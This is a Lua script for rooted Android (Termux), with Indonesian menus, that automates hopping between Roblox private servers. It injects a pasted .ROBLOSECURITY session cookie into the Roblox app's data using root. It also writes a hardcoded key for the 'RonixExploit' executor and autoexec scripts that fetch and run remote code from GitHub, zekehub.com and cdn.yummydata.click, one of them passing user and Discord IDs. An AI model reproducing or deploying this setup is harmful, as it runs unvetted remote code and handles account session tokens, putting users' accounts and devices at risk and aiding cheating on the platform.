-- Simple PS Hopper v1.4
-- Single package | Menu-based | sleep-based loop
-- Target: Termux + Root Android
-- ============================================

local HOPPER_LOG  = "/sdcard/hopper_log.txt"
local PS_FILE     = "/sdcard/private_servers.txt"
local PKG_FILE    = "/sdcard/.hopper_pkg"
local COOKIE_FILE = "/sdcard/.hopper_cookie"
local STOP_FILE   = "/sdcard/.hopper_stop"
local HOP_FILE    = "/sdcard/.hopper_interval"   -- [NEW] simpan interval

local RONIX_KEY_DIR  = "/storage/emulated/0/RonixExploit/internal/"
local RONIX_KEY_PATH = RONIX_KEY_DIR .. "_key.txt"
local RONIX_KEY_VAL  = "LzuYkZDBBIkVTMHEBAJGxZwqycRUimlL"
local RONIX_AE_DIR   = "/storage/emulated/0/RonixExploit/autoexec/"
local RONIX_AE_PATH  = RONIX_AE_DIR .. "Accept.lua"
local RONIX_AE_SCRIPT = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Fluxyyy333/Auto-Rebirth-speed/refs/heads/main/jgndiambilbg"))()
getgenv().scriptkey="HsMgJbFoUwmvfzGxLESxMiUFuYpyqfFA"
loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Utility.lua"))()]]

local RONIX_TRACK_PATH   = RONIX_AE_DIR .. "Trackstat.lua"
local RONIX_TRACK_SCRIPT = '_G.Config={UserID="37825915-c3be-41bc-987f-661da09d9b3c",discord_id="757533465213141053",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end'

local PKG     = ""
local HOP_MIN = 0

-- ============================================
-- HELPERS
-- ============================================
local function sleep(s)
    if s and s > 0 then os.execute("sleep " .. tostring(s)) end
end

local function su_exec(cmd)
    os.execute("su -c '" .. cmd:gsub("'","'\\''") .. "' >/dev/null 2>&1")
end

local function log(msg)
    local f = io.open(HOPPER_LOG, "a")
    if f then f:write(os.date("[%H:%M:%S] ") .. msg .. "\n"); f:close() end
end

local function cls()
    io.write("\27[2J\27[3J\27[H\27[0m"); io.flush()
end

local function ask(prompt)
    io.write(prompt .. " > "); io.flush()
    local tty = io.open("/dev/tty", "r")
    local r
    if tty then r = tty:read("*l"); tty:close()
    else r = io.read("*l") end
    return r and r:gsub("^%s+",""):gsub("%s+$","") or ""
end

local function file_exists(path)
    local f = io.open(path, "r")
    if f then f:close(); return true end
    return false
end

local function save_file(path, content)
    local f = io.open(path, "w")
    if f then f:write(content); f:close() end
end

local function read_file(path)
    local f = io.open(path, "r")
    if not f then return "" end
    local c = f:read("*a") or ""; f:close()
    return c:gsub("%c",""):gsub("^%s+",""):gsub("%s+$","")
end

local function load_ps()
    local f = io.open(PS_FILE, "r")
    if not f then return {} end
    local list = {}
    for line in f:lines() do
        local l = line:gsub("%c",""):gsub("^%s+",""):gsub("%s+$","")
        if l ~= "" and not l:match("^#")
            and l:match("^https?://")
            and l:lower():match("code=") then
            table.insert(list, l)
        end
    end
    f:close()
    return list
end

local function tail_log(n)
    local lines = {}
    local f = io.open(HOPPER_LOG, "r")
    if not f then return {} end
    for line in f:lines() do table.insert(lines, line) end
    f:close()
    local out = {}
    local s = math.max(1, #lines - n + 1)
    for i = s, #lines do table.insert(out, lines[i]) end
    return out
end

-- [NEW] Simpan hop interval ke file
local function save_hop()
    save_file(HOP_FILE, tostring(HOP_MIN))
end

-- ============================================
-- CORE
-- ============================================
local function is_running()
    if PKG == "" then return false end
    local h = io.popen("su -c 'pidof " .. PKG .. "' 2>/dev/null")
    if not h then return false end
    local r = h:read("*a") or ""; h:close()
    return r:match("%d+") ~= nil
end

-- [NEW] Clear cache app tanpa hapus shared_prefs (cookie tetap aman)
local function clear_cache()
    if PKG == "" then return end
    log("Clearing cache: " .. PKG)
    -- Hapus folder cache & code_cache saja, bukan seluruh data
    su_exec("rm -rf /data/data/" .. PKG .. "/cache/*")
    su_exec("rm -rf /data/data/" .. PKG .. "/code_cache/*")
    -- Hapus juga cache eksternal di sdcard jika ada
    su_exec("rm -rf /sdcard/Android/data/" .. PKG .. "/cache/*")
    log("Cache cleared")
end

local function inject_cookie()
    local cookie = read_file(COOKIE_FILE)
    if cookie == "" or PKG == "" then return end
    local dir    = "/data/data/" .. PKG .. "/shared_prefs"
    local target = dir .. "/RobloxSharedPreferences.xml"
    local tmp    = "/sdcard/.hcookie_tmp.xml"
    local f = io.open(tmp, "w")
    if not f then log("ERR: gagal tulis cookie tmp"); return end
    f:write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n")
    f:write("<map>\n")
    f:write('    <string name=".ROBLOSECURITY">' .. cookie .. "</string>\n")
    f:write("</map>\n")
    f:close()
    su_exec("mkdir -p '" .. dir .. "'")
    su_exec("cp '" .. tmp .. "' '" .. target .. "'")
    local uid_h = io.popen("su -c 'stat -c %u /data/data/" .. PKG .. "' 2>/dev/null")
    local uid = uid_h and uid_h:read("*l") or ""
    if uid_h then uid_h:close() end
    uid = uid:gsub("%c",""):gsub("%s","")
    if uid ~= "" then
        su_exec("chown " .. uid .. ":" .. uid .. " '" .. target .. "'")
    end
    su_exec("chmod 660 '" .. target .. "'")
    os.remove(tmp)
    log("Cookie injected (uid=" .. uid .. ")")
end

local function inject_key()
    su_exec("mkdir -p '" .. RONIX_KEY_DIR .. "'")
    local f = io.open(RONIX_KEY_PATH, "w")
    if f then f:write(RONIX_KEY_VAL); f:close() end
    log("Key injected")
end

local function inject_autoexec()
    su_exec("mkdir -p '" .. RONIX_AE_DIR .. "'")
    local f = io.open(RONIX_AE_PATH, "w")
    if f then f:write(RONIX_AE_SCRIPT); f:close() end
    log("Autoexec injected")
end

local function inject_trackstat()
    su_exec("mkdir -p '" .. RONIX_AE_DIR .. "'")
    local f = io.open(RONIX_TRACK_PATH, "w")
    if f then f:write(RONIX_TRACK_SCRIPT); f:close() end
    log("Trackstat injected")
end

local function inject_all()
    inject_cookie()
    inject_key()
    inject_autoexec()
    inject_trackstat()
end

-- [MODIFIED] Clear cache dulu sebelum launch, lalu inject ulang cookie
local function launch(ps_link, ps_idx, ps_total)
    log(string.format("Launching PS %d/%d", ps_idx, ps_total))
    su_exec("am force-stop " .. PKG)
    sleep(1)

    -- [NEW] Clear cache setelah force-stop, sebelum launch
    clear_cache()
    sleep(1)

    -- Re-inject cookie setelah cache dibersihkan
    inject_cookie()

    local dp = ps_link:match("^intent://(.-)#Intent")
           or ps_link:gsub("^https?://","")
    local intent = "intent://" .. dp
        .. "#Intent;scheme=https;package=" .. PKG
        .. ";action=android.intent.action.VIEW;end"
    su_exec('am start --user 0 "' .. intent .. '"')
    log(string.format("Launched PS %d/%d", ps_idx, ps_total))
end

-- ============================================
-- MONITOR DISPLAY
-- ============================================
local function show_status(cur_ps, ps_total, crash_count,
                            runtime_m, hop_elapsed_m, status_str)
    cls()
    print("========================")
    print("   HOPPER MONITOR v1.4  ")
    print("========================")
    print("")
    print("Pkg    : " .. PKG)
    print(string.format("PS     : %d / %d", cur_ps, ps_total))
    print("Status : " .. status_str)
    print("Crash  : " .. crash_count)
    print(string.format("Runtime: %dm", runtime_m))
    if HOP_MIN > 0 then
        print(string.format("Hop    : %dm / %dm", hop_elapsed_m, HOP_MIN))
    else
        print("Hop    : OFF")
    end
    print("")
    print("--- Log ---")
    for _, line in ipairs(tail_log(4)) do
        print(line)
    end
    print("")
    print("========================")
    print("Ketik [q] + Enter untuk STOP")
    print("========================")
end

-- ============================================
-- HOPPER LOOP
-- ============================================
local function run_hopper()
    local ps_list = load_ps()
    if #ps_list == 0 then
        print("[!] Tidak ada PS link!"); sleep(2); return
    end
    if PKG == "" then
        print("[!] Package belum diset!"); sleep(2); return
    end

    os.remove(STOP_FILE)
    os.execute("rm -f " .. HOPPER_LOG .. " 2>/dev/null")

    log("=== Hopper Started ===")
    log("Pkg: " .. PKG .. " | PS: " .. #ps_list .. " | Hop: " .. HOP_MIN .. "m")

    local ptr         = 1
    local cur_ps      = 1
    local crash_count = 0
    local hop_sec     = HOP_MIN * 60
    local start_time  = os.time()
    local hop_time    = os.time()

    log("Injecting...")
    inject_all()

    launch(ps_list[ptr], ptr, #ps_list)
    cur_ps = ptr
    ptr = ptr + 1
    if ptr > #ps_list then ptr = 1 end

    while true do
        local h = io.popen("bash -c 'read -t 5 -r line < /dev/tty 2>/dev/null; echo \"$line\"' 2>/dev/null")
        local inp = ""
        if h then inp = h:read("*l") or ""; h:close() end
        inp = inp:gsub("%c",""):gsub("^%s+",""):gsub("%s+$","")

        if inp:lower() == "q" then
            log("User stop")
            goto hopper_stop
        end
        if file_exists(STOP_FILE) then
            log("Stop file detected")
            goto hopper_stop
        end

        local now           = os.time()
        local runtime_m     = math.floor((now - start_time) / 60)
        local hop_elapsed_s = now - hop_time
        local hop_elapsed_m = math.floor(hop_elapsed_s / 60)
        local running       = is_running()
        local status_str    = running and "RUNNING" or "NOT RUNNING"

        if not running then
            crash_count = crash_count + 1
            log("Crash #" .. crash_count .. " relaunch PS " .. cur_ps)
            launch(ps_list[cur_ps], cur_ps, #ps_list)
            hop_time = os.time()
        end

        if HOP_MIN > 0 and hop_elapsed_s >= hop_sec then
            log("Hop -> PS " .. ptr)
            launch(ps_list[ptr], ptr, #ps_list)
            cur_ps = ptr
            ptr = ptr + 1
            if ptr > #ps_list then ptr = 1 end
            hop_time = os.time()
            hop_elapsed_m = 0
        end

        local tick = math.floor((now - start_time) % 60)
        if tick < 5 then
            show_status(cur_ps, #ps_list, crash_count,
                        runtime_m, hop_elapsed_m, status_str)
        end
    end

    ::hopper_stop::
    os.remove(STOP_FILE)
    log("=== Hopper Stopped ===")
    show_status(cur_ps, #ps_list, crash_count, 0, 0, "STOPPED")
    print("")
end

-- ============================================
-- MENU HANDLERS
-- ============================================
local function menu_set_package()
    cls()
    print("=== SET PACKAGE ===")
    print("")
    local saved = read_file(PKG_FILE)
    if saved ~= "" then print("Tersimpan: " .. saved); print("") end

    local h = io.popen("pm list packages 2>/dev/null")
    local pkgs = {}
    if h then
        local r = h:read("*a") or ""; h:close()
        for line in r:gmatch("[^\r\n]+") do
            local p = line:match("package:(.+)")
            if p then
                p = p:gsub("%c",""):gsub("^%s+",""):gsub("%s+$","")
                if p ~= "" then table.insert(pkgs, p) end
            end
        end
        table.sort(pkgs)
    end

    if #pkgs > 0 then
        print("Package tersedia:")
        for i, p in ipairs(pkgs) do
            print(string.format("  %d. %s", i, p))
        end
        print("")
    end

    local inp = ask("Nomor / nama (kosong=batal)")
    if inp == "" then return end
    local n = tonumber(inp)
    local new_pkg = (n and pkgs[n]) or inp
    if new_pkg and new_pkg ~= "" then
        PKG = new_pkg
        save_file(PKG_FILE, PKG)
        print("[+] Package: " .. PKG)
    else
        print("[!] Tidak valid")
    end
    sleep(1)
end

local function menu_set_cookie()
    cls()
    print("=== SET COOKIE ===")
    print("")
    local saved = read_file(COOKIE_FILE)
    if saved ~= "" then
        print("Tersimpan: " .. saved:sub(1,20) .. "...")
        print("")
        local ch = ask("Ganti? (y/n)")
        if ch:lower() ~= "y" then return end
    end
    print("Paste .ROBLOSECURITY (kosong=batal):")
    print("")
    local raw = ask("")
    if raw == "" then print("Batal."); sleep(1); return end
    local ck = raw:match("(_|WARNING.+)$") or raw
    save_file(COOKIE_FILE, ck)
    os.execute("chmod 600 '" .. COOKIE_FILE .. "'")
    print("[+] Cookie disimpan.")
    sleep(1)
end

local function menu_set_ps()
    while true do
        cls()
        print("=== PS LINKS ===")
        print("")
        local ps = load_ps()
        if #ps == 0 then
            print("  (kosong)")
        else
            for i, l in ipairs(ps) do
                local d = #l > 42
                    and (l:sub(1,25) .. "..." .. l:sub(-12))
                    or l
                print(string.format("  [%d] %s", i, d))
            end
        end
        print("")
        print("a=Tambah  d=Hapus  c=Clear  0=Kembali")
        print("")
        local opt = ask("")
        if opt == "0" or opt == "" then break

        elseif opt == "a" then
            print("Paste link (kosong=selesai):")
            local wf = io.open(PS_FILE, "a")
            local added = 0
            while true do
                local line = ask("")
                if line == "" then break end
                if line:match("^https?://") and line:lower():match("code=") then
                    if wf then wf:write(line .. "\n") end
                    added = added + 1
                    print("  [+] " .. added)
                else
                    print("  [!] Tidak valid")
                end
            end
            if wf then wf:close() end
            print(added .. " ditambahkan."); sleep(1)

        elseif opt == "d" then
            local ps2 = load_ps()
            if #ps2 == 0 then print("Kosong."); sleep(1)
            else
                local n = tonumber(ask("Hapus nomor"))
                if n and ps2[n] then
                    table.remove(ps2, n)
                    local wf = io.open(PS_FILE, "w")
                    if wf then
                        for _, l in ipairs(ps2) do wf:write(l.."\n") end
                        wf:close()
                    end
                    print("[+] Dihapus."); sleep(1)
                else print("[!] Tidak valid"); sleep(1) end
            end

        elseif opt == "c" then
            if ask("Ketik 'hapus'") == "hapus" then
                save_file(PS_FILE, "")
                print("[+] Semua dihapus."); sleep(1)
            end
        end
    end
end

-- [MODIFIED] Sekarang auto-save ke file setiap kali interval diubah
local function menu_set_hop()
    cls()
    print("=== SET HOP INTERVAL ===")
    print("")
    print("Saat ini: " .. (HOP_MIN == 0 and "OFF" or HOP_MIN .. "m"))
    print("")
    local inp = ask("Hop tiap berapa menit? (0=OFF)")
    local v = tonumber(inp)
    if v and v >= 0 then
        HOP_MIN = v
        save_hop()   -- [NEW] simpan ke file
        print("[+] Hop: " .. (HOP_MIN == 0 and "OFF" or HOP_MIN .. "m") .. " (tersimpan)")
    else
        print("[!] Tidak valid")
    end
    sleep(1)
end

-- ============================================
-- MAIN MENU
-- ============================================
local function main()
    PKG = read_file(PKG_FILE)

    -- [NEW] Load hop interval dari file saat startup
    local saved_hop = tonumber(read_file(HOP_FILE)) or 0
    if saved_hop >= 0 then HOP_MIN = saved_hop end

    while true do
        cls()
        print("=== SIMPLE HOPPER v1.4 ===")
        print("")
        local cookie = read_file(COOKIE_FILE)
        local ps     = load_ps()
        print("Package : " .. (PKG ~= "" and PKG or "-"))
        print("Cookie  : " .. (cookie ~= "" and cookie:sub(1,16).."..." or "-"))
        print("PS      : " .. #ps)
        print("Hop     : " .. (HOP_MIN == 0 and "OFF" or HOP_MIN.."m"))
        print("")
        print("1. Set package")
        print("2. Set cookie")
        print("3. Kelola PS links")
        print("4. Set hop interval")
        print("5. START")
        print("0. Keluar")
        print("")
        local ch = ask("Pilih")
        if     ch == "1" then menu_set_package()
        elseif ch == "2" then menu_set_cookie()
        elseif ch == "3" then menu_set_ps()
        elseif ch == "4" then menu_set_hop()
        elseif ch == "5" then run_hopper()
        elseif ch == "0" then cls(); print("Keluar."); break
        end
    end
end

-- ============================================
-- ENTRY
-- ============================================
cls()
main()
